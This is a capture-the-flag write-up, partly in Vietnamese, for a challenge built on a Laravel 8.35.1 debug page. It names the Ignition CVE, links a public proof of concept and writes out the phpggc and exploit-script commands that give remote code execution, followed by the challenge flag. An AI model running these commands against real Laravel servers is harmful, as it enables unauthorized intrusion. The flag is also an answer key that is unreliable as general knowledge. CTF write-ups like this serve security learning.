DaaS
===
### Description
We suspect this server holds valuable information that would further benefit our cause, but we've hit a dead end with this debug page running on a known framework called Laravel. Surely we couldn't exploit this further.. right?

### Overview
Site của trang này là trang chủ của framework laravel. Ở phía cuối site chúng ta có thể thấy được version của laravel và php đang sử dụng cho trang web này.
Laravel v8.35.1 và PHP v7.4.16

### Solution
- Chúng ta không được chung cấp source code hay bất cứ thứ gì ngoài version vì vậy mình đã nghĩ có lẽ là một CVE nào đó liên quan đến version của laravel đang sử dụng. Sau khi tìm kiếm trên google thì mình thấy được có một lỗi CVE liên quan đến version của laravel v8.35.1 là `debug mode`.
- Đây là poc mà mình tìm thấy https://github.com/ambionics/laravel-exploits
- Vì vậy bây giờ chúng ta chỉ cần exploit theo poc này.

### Payload
Step 1: Download file `laravel-ignition-rce.py` và `phpggc` về máy
Step 2: `php -d'phar.readonly=0' ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system ls`
Step 3: `python3 laravel-ignition-rce.py http://138.68.147.93:30173/ /tmp/exploit.phar`

Vậy là chúng ta có thể rce nó. Cuối cùng chỉ cần thay `ls` bằng `"cat flag"` và làm lại từ bước 2 là có flag

### Flag
`CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}`